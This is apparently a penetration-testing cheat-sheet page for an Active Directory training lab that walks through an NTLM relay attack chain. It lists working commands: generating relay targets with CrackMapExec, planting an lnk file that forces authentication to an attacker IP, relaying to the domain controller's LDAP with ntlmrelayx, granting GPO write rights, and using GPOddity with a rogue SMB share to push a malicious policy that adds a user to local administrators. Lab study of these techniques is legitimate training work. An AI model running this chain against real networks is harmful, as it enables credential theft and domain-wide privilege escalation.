# NTLM Relay

When capturing a [NTLMv1/2](https://www.vaadata.com/blog/understanding-ntlm-authentication-and-ntlm-relay-attacks/) hashes with tools like Responder, attackers have two options:

* crack it to retrieve cleartext passwords
* relay it to gain code execution on a target

{% hint style="warning" %}
The relayed user must have privilege on the target.
{% endhint %}

### Valid targets <a href="#valid-targets" id="valid-targets"></a>

In order to relay hashes, we must have valid targets. **Valid targets are machines with SMB Signing disabled**.

SMB Signing is disabled by default on every Windows OS, except Windows Server.

To create a list file of valid targets, use [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec):

```bash
cme smb <networkIP>/<cidr> --gen-relay-list relayTargets.txt
```

### Relaying hashes <a href="#relaying-hashes" id="relaying-hashes"></a>

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption><p>Found from <a href="https://aas-s3curity.gitbook.io/cheatsheet/internalpentest/active-directory/exploitation/exploit-without-account/smb-relay">here</a></p></figcaption></figure>

Create a shortcurt lnk file with the below content  and place it inside th shared AI folder.

```powershell
powershell "iwr 172.16.x.x -UseDefaultCredentials"
```

Run the below comamnd in the WSL Linux to relay the credentials to the DC.

```bash
sudo ntlmrelayx.py -t ldap://dcorp-dc.dollarcorp.moneycorp.local --http-port '80,8080' -i --no-smb-server
```

Use netcat to connect to the interactive session and use the below to add the user to have write access to the GPO.

<pre class="language-aspnet"><code class="lang-aspnet"><strong>write_gpo_dacl studentx {0BF8D01C-1F62-4BDC-958C-57140B67D147}
</strong></code></pre>

Now malicious GPO template can injected through GPOddity - [https://github.com/synacktiv/GPOddity](https://github.com/synacktiv/GPOddity)

<pre class="language-bash"><code class="lang-bash"># In linux machine change to the tool directory
<strong>cd /mnt/c/AD/Tools/GPOddity
</strong><strong># Use the GPOddity
</strong>sudo python3 gpoddity.py --domain dollarcorp.moneycorp.local --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --username studentx --password xyzdsfsddsf --dc-ip 172.16.2.1 --command "net localgroup administrators studentx  /add" --rogue-smbserver-ip 172.16.100.x --rogue-smbserver-share 'std-anything' --smb-mode none 
# Create a share with the name mentioned above and host the template. Run with admin cmd
net share std-anything=C:\AD\Tools\ GPOddity\GPT_out
# Grant everyone permission to those templates
icacls "C:\AD\Tools\GPOddity\GPT_out" /grant Everyone:F /T
# Verify the persmission with
Get-DomainGPO # Check gpcfilesyspath and whenchanged
winrs -r:dcorp-ci cmd /c "set computername &#x26;&#x26; set username"
</code></pre>

